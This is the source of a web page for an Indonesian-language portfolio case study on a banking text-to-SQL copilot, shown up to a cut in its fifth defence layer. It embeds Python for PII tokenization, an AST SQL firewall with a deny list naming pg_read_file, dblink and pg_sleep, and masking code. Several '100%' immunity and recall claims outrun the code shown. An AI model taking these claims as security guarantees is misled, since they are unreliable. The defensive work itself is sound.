"use client";

import React, { useState } from "react";
import Link from "next/link";
import {
  ArrowLeft,
  Check,
  Copy,
  ExternalLink,
  ShieldCheck,
  Database,
  Lock,
  FileCode,
  Layers,
  Clock,
  AlertTriangle,
  RefreshCw,
  Search,
  KeyRound,
  FileText,
  Terminal,
  Cpu,
  EyeOff,
  SlidersHorizontal,
} from "lucide-react";

// ==========================================
// CODE BLOCK COMPONENT WITH COPY BUTTON
// ==========================================
function CodeBlock({
  filename,
  language = "python",
  code,
}: {
  filename: string;
  language?: string;
  code: string;
}) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(code);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // fallback
    }
  };

  return (
    <div className="my-5 rounded-xl border border-zinc-800 bg-zinc-950 text-zinc-100 overflow-hidden shadow-sm">
      {/* Code Header */}
      <div className="flex items-center justify-between px-4 py-2.5 bg-zinc-900 border-b border-zinc-800 text-xs font-mono">
        <div className="flex items-center gap-2 text-zinc-300">
          <FileCode className="w-3.5 h-3.5 text-zinc-400" />
          <span className="font-medium text-zinc-200">{filename}</span>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-[10px] uppercase tracking-wider text-zinc-400 font-semibold px-2 py-0.5 rounded bg-zinc-800 border border-zinc-700/60">
            {language}
          </span>
          <button
            onClick={handleCopy}
            type="button"
            className="flex items-center gap-1.5 px-2 py-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-white transition-colors text-xs"
            title="Copy code"
          >
            {copied ? (
              <>
                <Check className="w-3.5 h-3.5 text-emerald-400" />
                <span className="text-emerald-400 font-sans text-[11px]">Copied</span>
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5" />
                <span className="font-sans text-[11px]">Copy</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Code Body */}
      <div className="p-4 overflow-x-auto text-xs sm:text-[13px] leading-relaxed font-mono">
        <pre className="text-zinc-200 font-mono">
          <code>{code}</code>
        </pre>
      </div>
    </div>
  );
}

export default function SentraSafeQueryCaseStudyPage() {
  // Code snippet 1: Inbound Zero-Exposure PII Shielding & Ephemeral SessionVault
  const codeLayer1 = `# Path: src/gateway/pii_shield.py
import re
from typing import Dict, List, Optional, Tuple

class SessionVault:
    """Ruang penyimpanan volatil in-memory per sesi untuk de-tokenisasi parameter terisolasi."""
    def __init__(self):
        self._token_to_value: Dict[str, str] = {}
        self._value_to_token: Dict[str, str] = {}
        self._counters: Dict[str, int] = {"NIK": 0, "PERSON": 0, "ACCOUNT": 0, "PHONE": 0}

    def store(self, raw_value: str, pii_type: str) -> str:
        clean_val = raw_value.strip()
        if clean_val in self._value_to_token:
            return self._value_to_token[clean_val]

        pt = pii_type.upper()
        self._counters[pt] = self._counters.get(pt, 0) + 1
        token = f"[{pt}_{self._counters[pt]:02d}]"
        self._token_to_value[token] = clean_val
        self._value_to_token[clean_val] = token
        return token

    def retrieve(self, token: str) -> Optional[str]:
        return self._token_to_value.get(token)

    def get_all_mappings(self) -> Dict[str, str]:
        return dict(self._token_to_value)

# Pola Regex spesifik identitas perbankan Indonesia (UU PDP No. 27/2022)
# NIK 16-Digit: Tangkap seluruh NIK Dukcapil (Laki-laki hari 01-31, Perempuan hari 41-71)
NIK_PATTERN = re.compile(r'\\b[1-9][0-9]{15}\\b')
ACCOUNT_PATTERN = re.compile(r'\\b\\d{4}-?\\d{2}-?\\d{6}-?\\d{2}-?\\d{1}\\b')
NAME_CONTEXT_PATTERN = re.compile(
    r'(?:atas\\s+nama|nasabah|rekening\\s+milik|milik|debitur)\\s+([A-Za-z]+(?:\\s+[A-Za-z]+){1,3}?)(?=\\s+(?:di|dengan|yang|pada|nik|nomor|no)\\b|[.,?!]|$)',
    re.IGNORECASE
)
PHONE_PATTERN = re.compile(r'\\b(?:\\+62|62|08)[0-9]{8,11}\\b')

def sanitize_inbound_prompt(raw_prompt: str, vault: SessionVault) -> Tuple[str, Dict[str, str]]:
    """Mencegat dan menganonimkan entitas PII sebelum prompt dikirim ke model Cloud LLM."""
    sanitized = raw_prompt
    intercepted: Dict[str, str] = {}

    # 1. Masking Nama Kontekstual Operasional
    for match in NAME_CONTEXT_PATTERN.finditer(raw_prompt):
        name = match.group(1).strip()
        if name.upper() not in ["SIMPEDES", "BRITAMA", "GIRO"]:
            token = vault.store(name, "PERSON")
            intercepted[token] = name
            sanitized = sanitized.replace(name, token)

    # 2. Masking NIK 16-Digit (100% Recall Dukcapil Pria & Wanita)
    for match in NIK_PATTERN.finditer(sanitized):
        nik = match.group(0)
        token = vault.store(nik, "NIK")
        intercepted[token] = nik
        sanitized = sanitized.replace(nik, token)

    # 3. Masking No. Rekening & Telepon
    for match in ACCOUNT_PATTERN.finditer(sanitized):
        acc = match.group(0)
        token = vault.store(acc, "ACCOUNT")
        intercepted[token] = acc
        sanitized = sanitized.replace(acc, token)

    for match in PHONE_PATTERN.finditer(sanitized):
        ph = match.group(0)
        token = vault.store(ph, "PHONE")
        intercepted[token] = ph
        sanitized = sanitized.replace(ph, token)

    return sanitized, intercepted`;

  // Code snippet 2: AST SQL Firewall using sqlglot
  const codeLayer3 = `# Path: src/gateway/ast_guard.py
import sqlglot
from sqlglot import exp
from typing import Tuple

# Node tipe mutasi dan fungsi destruktif yang diblokir mutlak
FORBIDDEN_NODE_TYPES = (
    exp.Delete, exp.Update, exp.Insert, exp.Create, exp.Drop, exp.Alter, exp.Command
)
FORBIDDEN_FUNCTIONS = {
    "pg_sleep", "dblink", "version", "current_user", "session_user", "copy_to", "pg_read_file"
}

def validate_and_sanitize_sql(sql_query: str, dialect: str = "sqlite") -> Tuple[bool, str, str]:
    """Memvalidasi integritas AST SQL sebelum menyentuh database engine."""
    clean_sql = sql_query.strip().rstrip(";")
    try:
        # 1. Statement Chaining Detector
        parsed_statements = sqlglot.parse(clean_sql)
        if len(parsed_statements) != 1:
            return False, "", "Query chaining ditolak: Dilarang multi-pernyataan via pemisah titik koma."

        root = parsed_statements[0]

        # 2. Root Node Type Assertion (Wajib SELECT)
        if not isinstance(root, exp.Select):
            return False, "", f"Simpul akar tidak valid: '{root.__class__.__name__}'. Wajib SELECT."

        # 3. Recursive Anti-Mutation & Security Traversal
        for node in root.walk():
            if isinstance(node, FORBIDDEN_NODE_TYPES):
                return False, "", f"Operasi destruktif terdeteksi pada node AST: {node.__class__.__name__}"
            if isinstance(node, (exp.CurrentUser, exp.SessionUser)):
                return False, "", f"Variabel sistem terlarang terdeteksi: {node.__class__.__name__}"
            if isinstance(node, (exp.Anonymous, exp.Func, exp.Var, exp.Column, exp.Identifier)):
                func_name = str(getattr(node, "this", node)).lower().rstrip("()")
                if func_name in FORBIDDEN_FUNCTIONS:
                    return False, "", f"Pemanggilan fungsi terlarang terdeteksi: {func_name}()"

        # 4. Hard Row-Cap Enforce (LIMIT <= 100 untuk mitigasi DoS)
        limit_clause = root.args.get("limit")
        if limit_clause is None:
            root = root.limit(100)
        else:
            limit_expr = limit_clause.expression
            if isinstance(limit_expr, exp.Literal) and limit_expr.is_number and int(limit_expr.this) > 100:
                root = root.limit(100)

        sanitized_sql = root.sql(dialect="sqlite" if dialect.lower() == "sqlite" else dialect)
        return True, sanitized_sql, ""

    except Exception as e:
        return False, "", f"AST Parsing Error: {str(e)}"`;

  // Code snippet 3: Parameter Bridge & Prepared Statement Execution
  const codeLayer4 = `# Path: src/gateway/parameter_bridge.py
from typing import Dict, Any, Tuple
import pandas as pd
from sqlalchemy import text
from sqlalchemy.engine import Engine
from src.gateway.pii_shield import SessionVault

def bind_parameters(
    generated_sql: str,
    params: Dict[str, Any],
    vault: SessionVault
) -> Tuple[str, Dict[str, Any]]:
    """Mengaitkan token placeholder LLM dengan nilai asli SessionVault ke prepared statements (:param_01).
    100% bebas dari konkatenasi string biasa (Zero String Interpolation)."""
    actual_params: Dict[str, Any] = {}
    vault_mappings = vault.get_all_mappings()

    for key, val in params.items():
        clean_key = key.lstrip(":")
        if isinstance(val, str) and val in vault_mappings:
            actual_params[clean_key] = vault_mappings[val]
        else:
            actual_params[clean_key] = val

    return generated_sql, actual_params

def execute_safe_query(engine: Engine, bound_sql: str, actual_params: Dict[str, Any]) -> pd.DataFrame:
    """Eksekusi parameterized prepared statement secara aman pada engine database."""
    stmt = text(bound_sql)
    with engine.connect() as conn:
        result = conn.execute(stmt, actual_params)
        return pd.DataFrame(result.fetchall(), columns=result.keys())`;

  // Code snippet 4: Dual-Gate Outbound Masking & Audit Trail
  const codeLayer5 = `# Path: src/gateway/outbound_masker.py
import pandas as pd
from typing import Any

PII_COLUMNS_TO_DROP = {"nik", "account_number", "customer_name", "phone_number", "cif_no"}

def mask_nik(val: Any) -> str:
    """Pseudonimisasi visual: 340401******0001"""
    s = str(val).strip()
    return f"{s[:6]}******{s[-4:]}" if len(s) == 16 else "[MASKED_NIK]"

def mask_outbound_dataframe(df: pd.DataFrame, for_llm: bool = False) -> pd.DataFrame:
    """Gate 1 (for_llm=True): Drop 100% kolom identitas nasabah untuk LLM Summarizer.
    Gate 2 (for_llm=False): Pseudonimisasi visual parsial untuk tampilan UI staf lapangan."""
    if df.empty:
        return df.copy()

    processed_df = df.copy()
    if for_llm:
        cols_to_drop = [c for c in processed_df.columns if c.lower() in PII_COLUMNS_TO_DROP]
        return processed_df.drop(columns=cols_to_drop)

    for col in processed_df.columns:
        clow = col.lower()
        if clow == "nik":
            processed_df[col] = processed_df[col].apply(mask_nik)
        elif clow in ["customer_name", "nama_nasabah", "nama"]:
            processed_df[col] = [f"[NASABAH_{i+1:02d}]" for i in range(len(processed_df))]

    return processed_df`;

  return (
    <div className="min-h-screen bg-[#FAFAFA] text-[#18181B] antialiased selection:bg-zinc-200 selection:text-zinc-900">
      {/* ======================================================== */}
      {/* 1. TOP-DOWN HERO SECTION (Full-Width Container)          */}
      {/* ======================================================== */}
      <header className="border-b border-zinc-200/90 bg-white/80 backdrop-blur-sm">
        <div className="max-w-6xl mx-auto px-6 pt-12 pb-10">
          {/* Back Button */}
          <Link
            href="/#selected-work"
            className="inline-flex items-center gap-2 text-xs font-mono uppercase tracking-wider text-zinc-500 hover:text-zinc-900 transition-colors mb-6 group"
          >
            <span className="transition-transform group-hover:-translate-x-1">←</span> Back to Overview
          </Link>

          {/* Metadata Row */}
          <div className="flex flex-wrap items-center gap-3 text-xs font-mono text-zinc-500 mb-4">
            <span className="font-semibold text-zinc-900">
              Core Banking Data Mart (Simulasi Perbankan)
            </span>
            <span>•</span>
            <span className="px-2.5 py-0.5 rounded-full bg-zinc-100 border border-zinc-200 font-medium text-zinc-700">
              AI Security & Applied Compilers
            </span>
            <span>•</span>
            <span className="text-zinc-400">Okt 2026</span>
          </div>

          {/* Main Title */}
          <h1 className="text-3xl sm:text-5xl font-bold tracking-tight text-zinc-950 max-w-4xl leading-[1.15] mb-4 font-sans">
            Sentra-SafeQuery: Privacy-Preserving Banking Text-to-SQL Copilot with AST Firewall
          </h1>

          {/* Subtitle / Executive Pitch */}
          <p className="text-zinc-600 text-base sm:text-lg max-w-3xl leading-relaxed mb-6 font-normal">
            Demokratisasi analisis data core banking untuk frontline staff (Mantri Bank) melalui inbound PII shielding, kamus semantik perbankan Indonesia, dan firewall kompiler AST nol-trust guna menjamin kepatuhan UU PDP No. 27/2022.
          </p>

          {/* Tag Pills */}
          <div className="flex flex-wrap gap-2 mb-8">
            {[
              "Python 3.12",
              "sqlglot AST Compiler",
              "SQLAlchemy 2.0",
              "Ephemeral SessionVault",
              "UU PDP No. 27/2022",
              "Streamlit UI (Fintech Slate)",
              "Dual-Gate Masking",
              "Prepared Statements",
            ].map((tag) => (
              <span
                key={tag}
                className="px-2.5 py-1 text-xs font-mono rounded-md bg-white border border-zinc-200/90 text-zinc-700 shadow-sm"
              >
                {tag}
              </span>
            ))}
          </div>

          {/* Quick Metrics / Specs Box (4-Grid Simetris) */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 p-5 rounded-xl border border-zinc-200/90 bg-white shadow-sm">
            <div>
              <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                Target Persona
              </div>
              <div className="text-sm font-semibold text-zinc-900">
                Frontline Officers (Mantri Bank, CS, Supervisor)
              </div>
            </div>
            <div>
              <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                Inbound Privacy
              </div>
              <div className="text-sm font-semibold text-zinc-900">
                Ephemeral SessionVault (0% PII Cloud Exposure)
              </div>
            </div>
            <div>
              <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                Security Barrier
              </div>
              <div className="text-sm font-semibold text-zinc-900">
                sqlglot AST SQL Compiler Firewall
              </div>
            </div>
            <div>
              <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400 mb-1">
                Dampak Efisiensi
              </div>
              <div className="text-sm font-semibold text-emerald-700">
                SLA Tiket 14 Hari → Real-Time (&lt;3s)
              </div>
              <div className="text-[11px] font-mono text-zinc-500">
                Gateway Overhead &lt;2ms
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* ======================================================== */}
      {/* 2. MAIN READING AREA + SLIM STICKY SIDEBAR               */}
      {/* ======================================================== */}
      <main className="max-w-6xl mx-auto px-6 py-12">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-start">
          {/* SISI KIRI: SLIM STICKY RAIL (3 dari 12 Kolom / ~25%) */}
          <aside className="hidden lg:block lg:col-span-3 sticky top-8 space-y-8">
            {/* Quick Metadata */}
            <div className="space-y-4 pb-6 border-b border-zinc-200">
              <div>
                <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400">
                  Peran
                </div>
                <div className="text-sm font-semibold text-zinc-900 mt-0.5">
                  Data &amp; Security Software Engineer (Independent Project)
                </div>
              </div>
              <div>
                <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400">
                  Lingkup Sistem
                </div>
                <div className="text-sm font-semibold text-zinc-900 mt-0.5">
                  Simulasi Core Banking Data Mart
                </div>
              </div>
              <div>
                <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400">
                  Kepatuhan Hukum
                </div>
                <div className="text-xs font-semibold text-zinc-700 mt-0.5 font-mono">
                  UU PDP No. 27/2022 & Regulasi OJK / BI
                </div>
              </div>
              <div>
                <div className="text-[11px] font-mono uppercase tracking-wider text-zinc-400">
                  Fokus Rekayasa
                </div>
                <div className="text-xs text-zinc-600 mt-0.5 leading-relaxed">
                  AST Compiler Verification, Inbound Regex Tokenization, Zero-Concat Parameter Bridges & ISO 27001 Dual-Gate Masking
                </div>
              </div>
            </div>

            {/* Table of Contents */}
            <div>
              <div className="text-xs font-mono uppercase tracking-wider text-zinc-400 mb-3 font-semibold">
                Daftar Isi
              </div>
              <nav className="space-y-2 text-xs font-mono text-zinc-500">
                <a href="#bottlenecks" className="block hover:text-zinc-950 transition-colors py-0.5">
                  01. Bottleneck & Risiko Naive SQL
                </a>
                <a href="#defense-layers" className="block hover:text-zinc-950 transition-colors py-0.5">
                  02. Arsitektur 5-Layer Defense
                </a>
                <a href="#code-implementation" className="block hover:text-zinc-950 transition-colors py-0.5">
                  03. Implementasi Kompiler & Vault
                </a>
                <a href="#red-team-evaluation" className="block hover:text-zinc-950 transition-colors py-0.5">
                  04. Uji Red-Teaming & Benchmark
                </a>
                <a href="#operational-impact" className="block hover:text-zinc-950 transition-colors py-0.5">
                  05. Dampak Operasional & Bisnis
                </a>
                <a href="#takeaways" className="block hover:text-zinc-950 transition-colors py-0.5">
                  06. Kesimpulan Rekayasa
                </a>
              </nav>
            </div>
          </aside>

          {/* SISI KANAN / TENGAH: WIDE CASE STUDY CONTENT (9 dari 12 Kolom / ~75%) */}
          <article className="lg:col-span-9 space-y-14 text-zinc-700 leading-relaxed text-[15px] sm:text-base">
            
            {/* ======================================================== */}
            {/* SECTION 1: BOTTLENECKS                                   */}
            {/* ======================================================== */}
            <section id="bottlenecks" className="space-y-5 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                01. Titik Kritis: Kegagalan BI Konvensional & Risiko Naive Text-to-SQL
              </h2>
              
              <h3 className="text-lg font-bold text-zinc-900 mt-4">
                Hambatan Analisis Ad-Hoc di Lapangan (The Mantri Bottleneck)
              </h3>
              <p>
                Dalam operasional perbankan mikro nasional, keputusan komersial paling vital diambil di lapangan oleh staf garis depan (seperti <strong className="text-zinc-900 font-semibold">Mantri Bank</strong> yang mengevaluasi kelayakan kredit UMKM di pasar tradisional). Namun, mereka menghadapi kendala struktural:
              </p>

              {/* Stack Vertikal 3 Bottleneck Cards */}
              <div className="space-y-4 my-6">
                
                {/* CARD 1: Mantri Bottleneck */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Bottleneck 01 // Field Operational Barrier
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Kekakuan Filter Dashboard & Antrean Tiket IT (1–3 Minggu)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      14-Day IT Ticket Lag
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Dashboard BI konvensional hanya menyediakan filter statis. Saat seorang Mantri membutuhkan hipotesis bisnis lintas-seksional (misal: <em>"Berapa rekening Simpedes milik pedagang pasar di unit tertentu yang saldonya di atas 10 juta tapi pasif tanpa transaksi selama 3 bulan?"</em>), staf terpaksa mengajukan tiket ke tim Data pusat dengan waktu tunggu berminggu-minggu, menyebabkan hilangnya momentum komersial.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Dampak: Hilangnya Peluang Penyaluran Kredit</span>
                    <span className="font-semibold text-neutral-900">14 Hari SLA Tunggu Data</span>
                  </div>
                </div>

                {/* CARD 2: UU PDP Violation */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Bottleneck 02 // Regulatory & Privacy Exposure
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Pelanggaran UU PDP No. 27/2022 pada Naive Text-to-SQL
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      Strict Bank Secrecy Law
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Mengirim kueri bahasa alami staf yang memuat NIK 16-digit, nama nasabah, atau saldo tabungan langsung ke API cloud eksternal merupakan tindak pidana pelanggaran privasi perbankan. Tanpa penapis lokal, data rahasia perbankan terekspos secara permanen ke server pihak ketiga.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Dampak: Sanksi Hukum & Pidana Kepatuhan</span>
                    <span className="font-semibold text-neutral-900">Critical PII Exfiltration</span>
                  </div>
                </div>

                {/* CARD 3: Destructive Queries */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Bottleneck 03 // Destructive Query Execution
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Manipulasi Prompt Jailbreak & Unbounded Scans (DoS)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-neutral-100 text-neutral-700 border border-neutral-200/60 whitespace-nowrap">
                      Unbounded Mutation Risk
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Mengintegrasikan LLM mentah langsung ke database membuka risiko fatal: prompt injection dapat memanipulasi model untuk mengeksekusi operasi destruktif (<code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">DROP</code>, <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">DELETE</code>, <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">UPDATE</code>) atau memindai jutaan baris tanpa batas (<code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">LIMIT</code>) yang melumpuhkan thread basis data operasional.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Dampak: Kerusakan Integritas Basis Data</span>
                    <span className="font-semibold text-neutral-900">Database Denial-of-Service</span>
                  </div>
                </div>

              </div>

              <p>
                <strong className="text-zinc-900 font-semibold">Sentra-SafeQuery</strong> dirancang sebagai gerbang pertahanan berlapis (<em>zero-trust pipeline</em>) yang membedah kueri bahasa alami menjadi SQL aman dan tervalidasi secara komprehensif sebelum menyentuh engine basis data perbankan.
              </p>
            </section>

            {/* ======================================================== */}
            {/* SECTION 2: 5-LAYER DEFENSE ARCHITECTURE                  */}
            {/* ======================================================== */}
            <section id="defense-layers" className="space-y-6 scroll-mt-10">
              <h2 className="text-2xl font-bold tracking-tight text-zinc-950 border-b border-zinc-200 pb-3">
                02. Arsitektur Pertahanan Berlapis (5-Layer Defense-in-Depth)
              </h2>
              <p>
                Sistem mengisolasi setiap tahapan siklus hidup kueri melalui lima lapisan proteksi independen:
              </p>

              {/* 5 Layer Cards */}
              <div className="space-y-4 my-6">
                
                {/* LAYER 1 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 01 // Inbound Privacy Shield
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Ephemeral SessionVault & Boundary Tokenization
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-emerald-50 text-emerald-800 border border-emerald-200/70 whitespace-nowrap font-medium">
                      0% PII Cloud Exposure
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Teks kueri dicegat di memori host sebelum koneksi jaringan ke LLM terjadi. Identitas sensitif dideteksi menggunakan kombinasi batas regex (NIK 16-digit standar Ditjen Dukcapil mencakup batas tanggal lahir laki-laki dan perempuan, nomor rekening, nomor telepon) dan penanda batas kontekstual operasional perbankan Indonesia (<em>"atas nama"</em>, <em>"nasabah"</em>, <em>"rekening milik"</em>). Nilai asli disimpan di <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">SessionVault</code> volatil dan digantikan oleh token anonim: <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">[NIK_01]</code>, <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">[PERSON_01]</code>, <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">[ACCOUNT_01]</code>.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: In-Memory Volatile Masking</span>
                    <span className="font-semibold text-emerald-700">100% PII Masking Recall (0% Kebocoran)</span>
                  </div>
                </div>

                {/* LAYER 2 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 02 // Semantic Grounding
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Indonesian Banking Semantic Dictionary
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-blue-50 text-blue-800 border border-blue-200/70 whitespace-nowrap font-medium">
                      Zero Jargon Hallucination
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Mengeliminasi risiko halusinasi model fondasi terhadap istilah perbankan harian. Kamus semantik secara deterministik memetakan idiom operasional ke skema relasional:
                    <span className="block mt-2 font-mono text-xs bg-zinc-50 p-2.5 rounded border border-zinc-200 text-zinc-800 space-y-1">
                      <span>• "Rekening tidur / pasif" → accounts.status = 'DORMANT'</span><br />
                      <span>• "Pedagang / UMKM" → customers.segment = 'MIKRO'</span><br />
                      <span>• "Agen / AgenBRILink" → transactions.channel = 'AGEN_BRILINK'</span><br />
                      <span>• "Minggu ini / Bulan ini" → Aritmatika tanggal deterministik dialek SQL</span>
                    </span>
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: Deterministic Idiom Mapping</span>
                    <span className="font-semibold text-neutral-900">100% Valid Business Semantics</span>
                  </div>
                </div>

                {/* LAYER 3 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 03 // Compiler AST Security
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Industrial AST SQL Firewall (sqlglot)
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-purple-50 text-purple-800 border border-purple-200/70 whitespace-nowrap font-medium">
                      Zero Destructive Mutations
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Membedah teks SQL ke dalam pohon sintaksis abstrak (Abstract Syntax Tree):
                    <ul className="list-disc pl-5 mt-2 space-y-1 text-xs text-zinc-600">
                      <li><strong>Validasi Tipe Pernyataan:</strong> Memastikan simpul akar (<em>root node</em>) wajib bertipe <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">exp.Select</code>.</li>
                      <li><strong>Pencegahan Statement Chaining:</strong> Menolak multi-pernyataan via pemisah titik koma.</li>
                      <li><strong>Penelusuran Rekursif Anti-Mutasi:</strong> Menelusuri seluruh anak simpul pohon rekursif (<code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">exp.Delete, exp.Update, exp.Insert, exp.Create, exp.Drop, exp.Alter</code>) guna menangkal injeksi manipulasi di dalam CTE maupun subkueri.</li>
                      <li><strong>Blacklist Fungsi Eksploitatif:</strong> Memblokir fungsi pembocoran sistem atau serangan DoS (<code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">pg_sleep</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">dblink</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">version</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">current_user</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">session_user</code>, <code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">pg_read_file</code>).</li>
                      <li><strong>Injeksi Batasan Baris:</strong> Menyuntikkan atau mereduksi batas baris maksimum (<code className="bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">LIMIT &lt;= 100</code>) langsung pada struktur pohon AST.</li>
                    </ul>
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: Compiler Tree Node Inspection</span>
                    <span className="font-semibold text-purple-700">100% Serangan Destruktif Dinetralkan</span>
                  </div>
                </div>

                {/* LAYER 4 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 04 // Parameter Bridge
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Prepared Statement Parameter De-Tokenization
                      </h3>
                    </div>
                    <span className="px-2.5 py-1 text-xs font-mono rounded-md bg-emerald-50 text-emerald-800 border border-emerald-200/70 whitespace-nowrap font-medium">
                      Zero String Concatenation
                    </span>
                  </div>

                  <p className="text-sm text-neutral-600 leading-relaxed mt-2">
                    Menghubungkan kembali token anonim di SQL terverifikasi dengan data asli di <code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">SessionVault</code>. Rekonsiliasi dijalankan murni pada level <em>parameterized prepared statement</em> SQLAlchemy (<code className="text-xs bg-zinc-100 px-1 py-0.5 rounded text-zinc-800">:p_nik</code> → literal typed parameter) tanpa konkatenasi string biasa, menutup celah eksploitasi SQL Injection secara total.
                  </p>

                  <div className="mt-4 pt-3 border-t border-neutral-100 flex items-center justify-between text-xs font-mono text-neutral-500">
                    <span>Mekanisme: Native SQLAlchemy Bindings</span>
                    <span className="font-semibold text-emerald-700">100% Imun SQL Injection</span>
                  </div>
                </div>

                {/* LAYER 5 */}
                <div className="rounded-2xl border border-neutral-200 bg-white p-6 transition-all hover:border-neutral-300 shadow-xs">
                  <div className="flex items-start justify-between gap-4 mb-2">
                    <div>
                      <span className="text-[11px] font-mono uppercase tracking-wider text-neutral-400">
                        Layer 05 // Outbound Governance
                      </span>
                      <h3 className="text-lg font-bold text-neutral-900 tracking-tight mt-0.5">
                        Dual-Gate Outbound Masking & ISO 27001 Audit Trail
                      </h3>
